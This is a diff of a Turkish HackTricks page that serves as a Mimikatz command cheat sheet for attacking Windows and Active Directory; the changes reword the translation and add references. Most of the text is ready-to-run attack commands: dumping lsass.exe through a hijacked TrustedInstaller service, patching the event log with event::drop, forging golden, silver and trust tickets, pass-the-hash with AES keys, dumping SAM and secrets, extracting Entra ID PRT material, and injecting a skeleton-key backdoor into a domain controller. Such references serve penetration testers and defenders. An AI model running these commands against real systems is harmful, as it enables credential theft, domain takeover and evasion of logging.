@@ -3,30 +3,30 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) üzerindeki bir sayfaya dayanmaktadır**. Daha fazla bilgi için orijinali kontrol edin!
+**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) adresindeki bir sayfayı temel almaktadır**. Daha fazla bilgi için orijinal sayfayı inceleyin!<sup>[[3]](#references)</sup>
 
-## LM and Clear-Text in memory
+## Bellekteki LM ve Clear-Text
 
-Windows 8.1 ve Windows Server 2012 R2’den itibaren, kimlik bilgisi hırsızlığına karşı koruma sağlamak için önemli önlemler uygulanmıştır:
+Windows 8.1 ve Windows Server 2012 R2 sürümlerinden itibaren credential theft'e karşı koruma sağlamak için önemli önlemler uygulanmıştır:
 
-- **LM hashes ve düz metin şifreler**, güvenliği artırmak için artık bellekte saklanmaz. Digest Authentication’ı devre dışı bırakmak ve LSASS içinde "clear-text" şifrelerin önbelleğe alınmamasını sağlamak için belirli bir registry ayarı olan _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri olarak `0` yapılandırılmalıdır.
+- **LM hash'leri ve düz metin parolalar**, güvenliği artırmak amacıyla artık bellekte saklanmamaktadır. LSASS içinde "clear-text" parolaların cache'lenmemesini sağlamak ve Digest Authentication'ı devre dışı bırakmak için belirli bir registry ayarı olan _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri `0` olarak yapılandırılmalıdır.
 
-- **LSA Protection**, Local Security Authority (LSA) sürecini yetkisiz bellek okuma ve code injection’a karşı korumak için tanıtılmıştır. Bu, LSASS’in protected process olarak işaretlenmesiyle sağlanır. LSA Protection’ı etkinleştirmek için:
-1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ registry’sinde `RunAsPPL` değerini `dword:00000001` olarak ayarlayın.
-2. Bu registry değişikliğini yönetilen cihazlarda zorlayan bir Group Policy Object (GPO) uygulayın.
+- **LSA Protection**, Local Security Authority (LSA) process'ini yetkisiz bellek okuma ve code injection işlemlerine karşı korumak için kullanıma sunulmuştur. Bu işlem, LSASS'ın protected process olarak işaretlenmesiyle gerçekleştirilir. LSA Protection'ı etkinleştirmek için:
+1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ registry anahtarındaki `RunAsPPL` değeri `dword:00000001` olarak değiştirilmelidir.
+2. Yönetilen cihazlarda bu registry değişikliğini zorunlu kılan bir Group Policy Object (GPO) uygulanmalıdır.
 
-Bu korumalara rağmen, Mimikatz gibi araçlar belirli drivers kullanarak LSA Protection’ı aşabilir; ancak bu tür eylemler büyük olasılıkla event logs’a kaydedilir.
+Bu korumalara rağmen Mimikatz gibi araçlar, belirli driver'ları kullanarak LSA Protection'ı aşabilir; ancak bu tür işlemler büyük olasılıkla event log'larına kaydedilir.
 
-Modern workstations üzerinde bu daha da önemlidir çünkü **Credential Guard birçok Windows 11 22H2+ ve Windows Server 2025 domain-joined, non-DC sistemde varsayılan olarak etkindir**, ayrıca **LSASS-as-PPL yeni Windows 11 22H2+ kurulumlarında varsayılan olarak etkindir**. Pratikte bu, `sekurlsa::logonpasswords` komutunun çoğu zaman eski tradecraft’ın beklediğinden daha az veri döndürmesi anlamına gelir ve operatörler giderek daha fazla **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** veya **CloudAP/PRT odaklı modüller**e yönelir. Koruma tarafı için [Windows credentials protections](credentials-protections.md) bölümüne bakın.
+Modern workstation'larda bu konu daha da önemlidir; çünkü **Credential Guard, Windows 11 22H2+ ve Windows Server 2025 domain-joined, DC olmayan sistemlerin birçoğunda varsayılan olarak etkindir** ve **LSASS-as-PPL, yeni Windows 11 22H2+ kurulumlarında varsayılan olarak etkindir**. Pratikte bu, `sekurlsa::logonpasswords` çıktısının çoğu zaman eski tradecraft'ın beklediğinden daha az veri içerdiği ve operatörlerin giderek **offline minidump'lara**, **Kerberos key extraction (`sekurlsa::ekeys`)** veya **CloudAP/PRT odaklı modüllere** yöneldiği anlamına gelir. Koruma tarafı için [Windows credentials protections](credentials-protections.md) sayfasına bakın.
 
-### Counteracting SeDebugPrivilege Removal
+### SeDebugPrivilege Removal'a Karşı Koyma
 
-Administrator’lar genellikle SeDebugPrivilege’e sahiptir ve bu da programları debug etmelerine olanak tanır. Bu privilege, saldırganların bellekteki credentials’ları çıkarmak için kullandığı yaygın bir teknik olan yetkisiz memory dumps’ı önlemek amacıyla kısıtlanabilir. Ancak, bu privilege kaldırılmış olsa bile, TrustedInstaller hesabı özelleştirilmiş bir service configuration kullanarak yine de memory dumps gerçekleştirebilir:
+Administrator'lar genellikle programlarda debug işlemi yapmalarını sağlayan SeDebugPrivilege yetkisine sahiptir. Bu yetki, saldırganların credential'ları bellekten çıkarmak için kullandığı yaygın bir teknik olan yetkisiz memory dump'larını önlemek amacıyla kısıtlanabilir. Ancak bu yetki kaldırılsa bile TrustedInstaller hesabı, özelleştirilmiş bir service configuration kullanarak memory dump'ları gerçekleştirebilir:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Bu, `lsass.exe` belleğinin bir dosyaya dökülmesine izin verir; ardından bu dosya başka bir sistemde kimlik bilgilerini çıkarmak için analiz edilebilir:
+Bu, `lsass.exe` belleğinin bir dosyaya dökülmesini sağlar; bu dosya daha sonra kimlik bilgilerini çıkarmak için başka bir sistemde analiz edilebilir:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -34,64 +34,64 @@ Bu, `lsass.exe` belleğinin bir dosyaya dökülmesine izin verir; ardından bu d
 ```
 ## Mimikatz Seçenekleri
 
-Mimikatz’te event log manipülasyonu iki temel eylemi içerir: event logları temizlemek ve yeni event’lerin kaydını engellemek için Event service’i patch’lemek. Aşağıda bu eylemleri gerçekleştirmek için komutlar verilmiştir:
+Mimikatz'te event log tampering iki temel eylemi içerir: event log'larını temizlemek ve yeni event'lerin loglanmasını önlemek için Event service'i patch'lemek. Aşağıda bu eylemleri gerçekleştirmek için kullanılan komutlar verilmiştir:
 
-#### Event Logları Temizleme
+#### Event Log'larını Temizleme
 
-- **Komut**: Bu eylem, event logları silmeyi amaçlar ve kötü amaçlı aktiviteleri takip etmeyi zorlaştırır.
-- Mimikatz, standart dokümantasyonunda event logları doğrudan command line üzerinden temizlemek için bir komut sunmaz. Ancak event log manipülasyonu genellikle belirli logları temizlemek için Mimikatz dışında sistem araçları veya scriptler kullanmayı içerir (ör. PowerShell veya Windows Event Viewer kullanarak).
+- **Komut**: Bu eylem, event log'larını silerek kötü amaçlı faaliyetlerin izlenmesini zorlaştırmayı amaçlar.
+- Mimikatz, standart dokümantasyonunda event log'larını doğrudan command line üzerinden temizlemek için bir komut sunmaz. Ancak event log manipulation genellikle belirli log'ları temizlemek için Mimikatz dışındaki system tools veya script'lerin kullanılmasını içerir (ör. PowerShell veya Windows Event Viewer kullanarak).
 
-#### Deneysel Özellik: Event Service’i Patch’lemek
+#### Experimental Feature: Event Service'i Patch'leme
 
 - **Komut**: `event::drop`
-- Bu deneysel komut, Event Logging Service’in davranışını değiştirmek ve etkili şekilde yeni event’leri kaydetmesini engellemek için tasarlanmıştır.
+- Bu experimental command, Event Logging Service'in davranışını değiştirerek yeni event'leri kaydetmesini etkili bir şekilde önlemek için tasarlanmıştır.
 - Örnek: `mimikatz "privilege::debug" "event::drop" exit`
 
-- `privilege::debug` komutu, Mimikatz’in sistem service’lerini değiştirmek için gerekli yetkilerle çalışmasını sağlar.
-- Ardından `event::drop` komutu Event Logging service’ini patch’ler.
+- `privilege::debug` komutu, Mimikatz'in system services'i değiştirmek için gerekli privileges ile çalışmasını sağlar.
+- Ardından `event::drop` komutu Event Logging service'i patch'ler.
 
 ### Kerberos Ticket Saldırıları
 
-Aşağıdaki komutları hızlı syntax hatırlatıcıları olarak kullanın. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) ve [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) için ayrılmış sayfalar, güncel AES/PAC/opsec ayrıntılarını içerir.
+Aşağıdaki komutları hızlı syntax hatırlatıcıları olarak kullanın. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) ve [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) için ayrılmış sayfalarda güncel AES/PAC/opsec ayrıntıları bulunur.
 
 ### Golden Ticket Oluşturma
 
-Golden Ticket, domain genelinde erişim taklidi yapılmasına izin verir. Temel komut ve parametreler:
+Golden Ticket, domain genelinde access impersonation sağlar. Temel komut ve parametreler:
 
 - Komut: `kerberos::golden`
 - Parametreler:
 - `/domain`: Domain adı.
-- `/sid`: Domain’in Security Identifier (SID)’ı.
-- `/user`: Taklit edilecek kullanıcı adı.
-- `/krbtgt`: Domain’in KDC service account’unun NTLM hash’i.
-- `/ptt`: Ticket’ı doğrudan belleğe enjekte eder.
-- `/ticket`: Ticket’ı daha sonra kullanım için kaydeder.
+- `/sid`: Domain'in Security Identifier'ı (SID).
+- `/user`: Impersonate edilecek username.
+- `/krbtgt`: Domain'in KDC service account'una ait NTLM hash.
+- `/ptt`: Ticket'ı doğrudan memory'ye inject eder.
+- `/ticket`: Ticket'ı daha sonra kullanmak üzere kaydeder.
 
 Örnek:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Silver Ticket Oluşturma
+### Silver Ticket Creation
 
-Silver Ticket’ler belirli servislere erişim sağlar. Temel komut ve parametreler:
+Silver Tickets belirli servislere erişim sağlar. Temel komut ve parametreler:
 
-- Komut: Golden Ticket’a benzer, ancak belirli servisleri hedefler.
-- Parametreler:
+- Command: Golden Ticket ile benzerdir ancak belirli servisleri hedefler.
+- Parameters:
 - `/service`: Hedeflenecek servis (ör. cifs, http).
 - Diğer parametreler Golden Ticket ile benzerdir.
 
-Örnek:
+Example:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Trust Ticket Oluşturma
+### Trust Ticket Creation
 
-Trust Tickets, trust ilişkilerinden yararlanarak domainler arasında kaynaklara erişim için kullanılır. Temel komut ve parametreler:
+Trust Ticket'lar, trust relationships kullanarak domain'ler arasındaki kaynaklara erişmek için kullanılır. Temel command ve parametreler:
 
-- Command: Golden Ticket'a benzer, ancak trust ilişkileri için.
+- Command: Trust relationships için Golden Ticket'a benzer.
 - Parameters:
-- `/target`: Hedef domainin FQDN'si.
-- `/rc4`: trust account için NTLM hash.
+- `/target`: Hedef domain'in FQDN'i.
+- `/rc4`: Trust account için NTLM hash'i.
 
 Example:
 ```bash
@@ -99,41 +99,41 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 ```
 ### Ek Kerberos Komutları
 
-- **Ticket’ları Listeleme**:
+- **Ticket'ları Listeleme**:
 
 - Komut: `kerberos::list`
-- Geçerli kullanıcı oturumu için tüm Kerberos ticket’larını listeler.
+- Mevcut kullanıcı oturumundaki tüm Kerberos ticket'larını listeler.
 
 - **Pass the Cache**:
 
 - Komut: `kerberos::ptc`
-- Cache dosyalarından Kerberos ticket’larını enjekte eder.
+- Cache dosyalarındaki Kerberos ticket'larını enjekte eder.
 - Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Pass the Ticket**:
 
 - Komut: `kerberos::ptt`
-- Bir Kerberos ticket’ının başka bir oturumda kullanılmasına izin verir.
+- Bir Kerberos ticket'ının başka bir oturumda kullanılmasını sağlar.
 - Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Ticket’ları Purge Etme**:
+- **Ticket'ları Temizleme**:
 - Komut: `kerberos::purge`
-- Oturumdaki tüm Kerberos ticket’larını temizler.
-- Ticket manipülasyon komutlarını kullanmadan önce çakışmaları önlemek için faydalıdır.
+- Oturumdaki tüm Kerberos ticket'larını temizler.
+- Çakışmaları önlemek amacıyla ticket manipulation komutlarını kullanmadan önce faydalıdır.
 
 ### Over-Pass-the-Hash / Pass-the-Key
 
-Eğer `RC4` devre dışıysa veya güvenilmezse, Mimikatz yalnızca bir NT hash kullanmak yerine geçerli logon oturumuna **AES128/AES256 Kerberos key**’lerini patch edebilir. Bu, `sekurlsa::pth` komutunu sadece NTLM ile sınırlı görmektense, genellikle modern domain’ler için daha uygundur.
+`RC4` devre dışıysa veya güvenilir değilse Mimikatz, yalnızca bir NT hash kullanmak yerine **AES128/AES256 Kerberos key'lerini** mevcut logon session'a patch edebilir. Bu yaklaşım, `sekurlsa::pth` komutunu yalnızca NTLM için kullanmaya kıyasla modern domain'ler için genellikle daha uygundur.<sup>[[1]](#references)</sup>
 ```bash
 mimikatz "privilege::debug" "sekurlsa::ekeys" exit
 mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
 mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
 ```
-`/impersonate` mevcut işlemi yeniden kullanır, yeni bir console başlatmaz; bu, aynı bağlamda hemen `lsadump::dcsync` gibi şeyleri çalıştırmak istediğinizde kullanışlıdır.
+`/impersonate`, yeni bir konsol başlatmak yerine mevcut process'i yeniden kullanır; bu, aynı context içinde `lsadump::dcsync` gibi komutları hemen çalıştırmak istediğinizde kullanışlıdır.
 
-### Active Directory Tampering
+### Active Directory Manipulation
 
-- **DCShadow**: Bir machine'i geçici olarak AD object manipulation için bir DC gibi davranacak şekilde yapın. Bkz. [DCShadow](../active-directory-methodology/dcshadow.md).
+- **DCShadow**: AD object manipulation için bir makinenin geçici olarak DC gibi davranmasını sağlar. Bkz. [DCShadow](../active-directory-methodology/dcshadow.md).
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
@@ -146,47 +146,47 @@ mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Bir computer account'un password data'sını kullanarak bir DC'yi taklit eder.
+- **LSADUMP::NetSync**: Bir computer account'un password data'sını kullanarak bir DC'yi impersonate eder.
 
-- _NetSync için orijinal bağlamda belirli bir komut verilmemiştir._
+- _Original context'te NetSync için belirli bir komut verilmemiştir._
 
 - **LSADUMP::SAM**: Yerel SAM database'ine erişir.
 
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: registry'de saklanan secrets'ları decrypt eder.
+- **LSADUMP::Secrets**: Registry'de saklanan secrets'ları decrypt eder.
 
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Bir user için yeni bir NTLM hash ayarlar.
+- **LSADUMP::SetNTLM**: Bir user için yeni bir NTLM hash'i ayarlar.
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: trust authentication information alır.
+- **LSADUMP::Trust**: Trust authentication information'ı alır.
 - `mimikatz "lsadump::trust" exit`
 
 ### Cloud credentials / Entra ID
 
-**Entra ID** veya **hybrid-joined** host'larda, `sekurlsa::cloudap` LSASS içindeki önbelleğe alınmış **Primary Refresh Token (PRT)** materyalini açığa çıkarabilir. İlişkili Proof-of-Possession key software-protected ise, `dpapi::cloudapkd` sonraki **Pass-the-PRT** workflow'ları için gereken clear/derived key materyalini türetebilir.
+**Entra ID** veya **hybrid-joined** host'larda `sekurlsa::cloudap`, LSASS'tan cache'lenmiş **Primary Refresh Token (PRT)** material'ını açığa çıkarabilir. İlişkili Proof-of-Possession key'i software-protected ise `dpapi::cloudapkd`, sonraki **Pass-the-PRT** workflow'larında gereken clear/derived key material'ını türetebilir.<sup>[[1]](#references)</sup>
 ```bash
 mimikatz "privilege::debug" "sekurlsa::cloudap" exit
 mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
 mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
 ```
-Key TPM-backed olduğunda bu çok daha zor hale gelir, ancak hybrid endpoint’lerde kontrol etmeye değer çünkü cached CloudAP verisi klasik `wdigest` çıktısından daha ilginç olabilir. Cloud-side abuse zinciri için [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) bölümüne bakın.
+Bu, anahtar TPM-backed olduğunda çok daha zor hale gelir, ancak hybrid endpoint'lerde kontrol etmeye değer; çünkü cached CloudAP verileri klasik `wdigest` çıktısından daha ilginç olabilir.<sup>[[2]](#references)</sup> Cloud-side abuse chain için [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) bölümüne bakın.
 
-### Miscellaneous
+### Çeşitli
 
-- **MISC::Skeleton**: Bir DC üzerindeki LSASS içine backdoor enjekte eder.
+- **MISC::Skeleton**: Bir DC üzerindeki LSASS'e backdoor inject eder.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Privilege Escalation
 
-- **PRIVILEGE::Backup**: Backup rights elde eder.
+- **PRIVILEGE::Backup**: Backup haklarını edinir.
 
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Debug privileges elde eder.
+- **PRIVILEGE::Debug**: Debug ayrıcalıkları elde eder.
 - `mimikatz "privilege::debug" exit`
 
 ### Credential Dumping
@@ -195,15 +195,15 @@ Key TPM-backed olduğunda bu çok daha zor hale gelir, ancak hybrid endpoint’l
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Bellekten Kerberos tickets çıkarır.
+- **SEKURLSA::Tickets**: Kerberos ticket'larını memory'den çıkarır.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### SID ve Token Manipulation
 
 - **SID::add/modify**: SID ve SIDHistory'yi değiştirir.
 
 - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Modify: _Orijinal bağlamda modify için belirli bir komut yok._
+- Modify: _Orijinal context'te modify için belirli bir command yok._
 
 - **TOKEN::Elevate**: Token'ları impersonate eder.
 - `mimikatz "token::elevate /domainadmin" exit`
@@ -215,17 +215,18 @@ Key TPM-backed olduğunda bu çok daha zor hale gelir, ancak hybrid endpoint’l
 - `mimikatz "ts::multirdp" exit`
 
 - **TS::Sessions**: TS/RDP session'larını listeler.
-- _Orijinal bağlamda TS::Sessions için belirli bir komut verilmemiştir._
+- _Orijinal context'te TS::Sessions için belirli bir command sağlanmamıştır._
 
 ### Vault
 
-- Windows Vault'tan passwords çıkarır.
+- Windows Vault'tan password'leri çıkarır.
 - `mimikatz "vault::cred /patch" exit`
 
 
 ## References
 
-- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
-- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
+- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
+- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
+- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)
 
 {{#include ../../banners/hacktricks-training.md}}
